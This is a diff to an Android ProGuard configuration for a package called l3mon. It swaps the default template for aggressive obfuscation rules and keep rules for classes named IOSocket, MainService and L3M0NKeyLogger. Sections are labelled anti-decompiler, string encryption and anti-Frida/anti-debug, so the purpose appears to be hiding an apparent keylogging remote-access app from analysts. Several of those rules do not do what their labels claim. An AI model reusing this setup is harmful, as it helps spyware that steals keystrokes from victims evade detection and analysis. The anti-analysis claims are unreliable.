@@ -1,17 +1,35 @@
-# Add project specific ProGuard rules here.
-# By default, the flags in this file are appended to flags specified
-# in /home/king/Android/Sdk/tools/proguard/proguard-android.txt
-# You can edit the include path and order by changing the proguardFiles
-# directive in build.gradle.
-#
-# For more details, see
-#   http://developer.android.com/guide/developing/tools/proguard.html
+# Ofuscação agressiva
+-optimizationpasses 5
+-allowaccessmodification
+-repackageclasses ''
+-flattenpackagehierarchy ''
+-obfuscationdictionary dictionary.txt
+-classobfuscationdictionary dictionary.txt
+-packageobfuscationdictionary dictionary.txt
 
-# Add any project specific keep options here:
+# Manter classes essenciais
+-keep class com.etechd.l3mon.** { *; }
+-keep class com.etechd.l3mon.IOSocket { *; }
+-keep class com.etechd.l3mon.MainService { *; }
+-keep class com.etechd.l3mon.L3M0NKeyLogger { *; }
 
-# If your project uses WebView with JS, uncomment the following
-# and specify the fully qualified class name to the JavaScript interface
-# class:
-#-keepclassmembers class fqcn.of.javascript.interface.for.webview {
-#   public *;
-#}
+# Manter métodos nativos e reflection
+-keepclassmembers class * {
+    public static ** get*(...);
+    public static ** set*(...);
+    public ** (android.content.Context);
+}
+
+# Anti-decompiler
+-dontusemixedcaseclassnames
+-dontskipnonpubliclibraryclasses
+-dontpreverify
+-verbose
+
+# String encryption (básico)
+-keepclassmembers class * {
+    <init>(...);
+}
+
+# Anti-Frida / Anti-Debug
+-keep class * implements android.os.IBinder { *; }
